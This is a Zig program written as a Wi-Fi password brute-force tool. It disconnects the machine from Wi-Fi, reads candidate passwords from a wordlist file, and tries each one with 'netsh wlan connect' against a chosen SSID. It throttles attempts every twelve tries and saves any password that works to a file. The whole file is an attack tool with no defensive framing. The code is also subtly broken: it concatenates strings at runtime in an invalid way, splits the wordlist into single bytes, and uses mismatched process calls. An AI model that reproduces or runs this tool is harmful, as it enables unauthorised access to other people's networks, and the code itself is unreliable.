const std = @import("std");

pub fn main() !void {
    var stdout = std.io.getStdOut().writer();
    var ssid: [256]u8 = undefined;
    const ssid_len = try get_input("Enter SSID: ", ssid[0..]);
    const ssid_slice = ssid[0..ssid_len];

    if (!try disconnect_wifi()) {
        return error.DisconnectFailed;
    }

    const file_path = "wc.txt"; 
    const file = try open_file(file_path);
    const passwords = try read_passwords(file, 1000);
    defer std.heap.page_allocator.free(passwords);

    var password_attempts: usize = 0;

    for (passwords) |password| {
        if (try try_password(ssid_slice, password)) {
            try save_password("found_password.txt", password);
            return null;
        }

        password_attempts += 1;
        if (password_attempts >= 12) {
            password_attempts = 0;
            std.time.sleep(1 * std.time.ns_per_s);
        }
    }

    try stdout.print("Password not found.\n", .{});
}

fn get_input(prompt: []const u8, buffer: []u8) !usize {
    const stdout = std.io.getStdOut().writer();
    try stdout.print("{s} ", .{prompt});
    const reader = std.io.getStdIn().reader();
    const bytes_read = try reader.read(buffer);
    return bytes_read;
}

fn open_file(path: []const u8) !*std.fs.File {
    return try std.fs.cwd().openFile(path, .{});
}

fn disconnect_wifi() !bool {
    const command = "netsh";
    const args: [][]const u8 = &[_][]const u8{
        "wlan",
        "disconnect",
    };

    const allocator = std.heap.page_allocator;
    var child = try std.process.Child.init(command, args, allocator);
    const result = try child.run();
    return result.exit_code == 0;
}

fn try_password(ssid: []const u8, password: []const u8) !bool {
    const command = "netsh";
    const args: [][]const u8 = &[_][]const u8{
        "wlan",
        "connect",
        "name=\"" ++ ssid ++ "\"",
        "key=\"" ++ password ++ "\"",
    };

    const allocator = std.heap.page_allocator;
    var child = try std.process.Child.init(command, args, allocator);
    const result = try child.run();
    return result.exit_code == 0;
}

fn read_passwords(file: *std.fs.File, chunk_size: usize) ![]const []const u8 {
    var passwords = std.ArrayList([]const u8).init(std.heap.page_allocator);
    while (true) {
        var temp_buffer: [chunk_size]u8 = undefined;
        const bytes_read = try file.read(&temp_buffer);
        if (bytes_read == 0) break;
        const slice = temp_buffer[0..bytes_read];
        for (slice) |password| {
            if (password.len == 0) continue;
            try passwords.append(password);
        }
    }
    return passwords.toSlice();
}

fn save_password(path: []const u8, password: []const u8) !void {
    var file = try std.fs.cwd().createFile(path, .{});
    defer file.close();
    try file.writeAll(password);
    try file.writeAll("\n");
}